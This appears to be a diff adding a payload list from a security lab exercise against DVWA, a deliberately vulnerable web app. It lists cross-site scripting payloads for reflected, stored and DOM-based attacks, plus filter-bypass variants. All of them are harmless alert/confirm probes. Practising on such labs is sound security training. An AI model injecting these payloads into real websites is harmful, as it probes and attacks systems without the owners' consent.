@@ -1,0 +1,28 @@
+## ✅ Updated `payload_used.txt`
+
+```txt
+# Payloads Used for XSS Testing in DVWA
+
+# ===== Reflected XSS =====
+<script>alert('XSS')</script>
+<img src=x onerror=alert('Reflected')>
+<svg/onload=alert('SVG')>
+%3Cscript%3Ealert('Encoded')%3C%2Fscript%3E
+
+# ===== Stored XSS =====
+<script>alert('Stored XSS')</script>
+<img src="x" onerror="alert('Stored')">
+<svg/onload=alert('SVG-Stored')>
+<script>confirm('Stored')</script>
+
+# ===== DOM-Based XSS =====
+<script>alert('DOM-XSS')</script>
+<svg/onload=confirm('DOM-Check')>
+"><script>alert('Injected')</script>
+
+# ===== Medium/High Filter Bypass =====
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert('XSS')>
+"><script>alert`XSS`</script>
+<iframe src="javascript:alert('XSS')">
